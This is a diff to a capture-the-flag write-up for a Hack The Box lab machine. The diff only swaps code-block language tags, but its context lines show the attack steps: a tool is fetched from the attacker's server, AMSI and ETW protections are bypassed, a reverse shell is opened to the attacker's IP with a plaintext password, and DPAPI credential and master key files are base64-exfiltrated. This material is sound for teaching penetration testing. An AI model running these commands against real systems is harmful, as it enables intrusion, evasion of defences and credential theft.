@@ -698,7 +698,7 @@ Serving HTTP on 0.0.0.0 port 1111 (http://0.0.0.0:1111/) ...
 10.10.11.45 - - [03/Sep/2025 14:07:04] "GET /Invoke-RunasCs.ps1 HTTP/1.1" 200
 
 ```
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> curl 10.10.14.15:1111/Invoke-RunasCs.ps1 -o Invoke-RunasCs.ps1
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> ls
@@ -714,7 +714,7 @@ Mode                 LastWriteTime         Length Name
 ```
 > But there is a problem which I mentioned above. The system is running `antivirus software`:
 
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> ./Invoke-RunasCs.ps1
 
@@ -736,7 +736,7 @@ At C:\Users\C.Neri\Documents\Invoke-RunasCs.ps1:1 char:1
 > [!IMPORTANT]
 `Bypass-4MSI` is a built-in module in `Evil-WinRM` designed to bypass the protection of `Antimalware Scan Interface (AMSI)` and `ETW (Event Tracing for Windows)`
 
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> menu
 
@@ -750,7 +750,7 @@ At C:\Users\C.Neri\Documents\Invoke-RunasCs.ps1:1 char:1
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> Bypass-4MSI
 
 ```
-```bash
+```powershell
 
 Info: Patching 4MSI, please be patient...
 
@@ -767,7 +767,7 @@ Info: Patching ETW, please be patient ..
 
 > After executing the module extract the `Invoke-RunasCs` function from the `Invoke-RunasCs.ps1` script using `dot-sourcing`:
 
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> . ./Invoke-RunasCs.ps1
 
@@ -777,7 +777,7 @@ Info: Patching ETW, please be patient ..
 
 > We start a second terminal session and activate the `nc` listener:
 
-```bash
+```powershell
 
 *Evil-WinRM* PS C:\Users\C.Neri\Documents> Invoke-RunasCs -Username C.Neri -password Zer0the0ne -Domain vintage.htb -Command powershell.exe -Remote 10.10.14.15:4343 -ForceProfile
 
@@ -788,7 +788,7 @@ Info: Patching ETW, please be patient ..
 *Evil-WinRM* PS C:\Users\C.Neri\Documents>
 
 ```
-```bash
+```powershell
 
 nc -lvnp 4343
 
@@ -813,7 +813,7 @@ PS C:\Windows\system32>
 
 > I display information about saved accounts in `cmdkey`:
 
-```bash
+```powershell
 
 PS C:\Windows\system32> cmdkey /list
 cmdkey /list
@@ -836,7 +836,7 @@ PS C:\Windows\system32>
 
 > The encrypted structure containing the login and password of the account is stored in special `.cred` files along the path - `C:\Users\<Username>\AppData\Roaming\Microsoft\Credentials`.
 
-```bash
+```powershell
 
 PS C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials> ls -h
 ls -h
@@ -867,12 +867,12 @@ the `MasterKey` linked to the current user.
 
 > First I need to transfer this structure to yourself. To do this, I will use the method of transferring information through `base64` encoding:
 
-```bash
+```powershell
 
 $file = "C:\Users\C.Neri\AppData\Roaming\Microsoft\Credentials\C4BB96844A5C9DD45D5B6A9859252BA6"
 
 ```
-```bash
+```powershell
 
 [Convert]::ToBase64String([IO.File]::ReadAllBytes($file))
 
@@ -905,12 +905,12 @@ dpapi.py credential -file creds
 
 > I transfer the key from the `..\protect` directory to my system in the same way:
 
-```bash
+```powershell
 
 $file = "C:\Users\C.Neri\AppData\Roaming\Microsoft\Protect\S-1-5-21-4024337825-2033394866-2055507597-1115\99cf41a3-a552-4cf7-a8d7-aca2d6f7339b"
 
 ```
-```bash
+```powershell
 
 [Convert]::ToBase64String([IO.File]::ReadAllBytes($file))
 
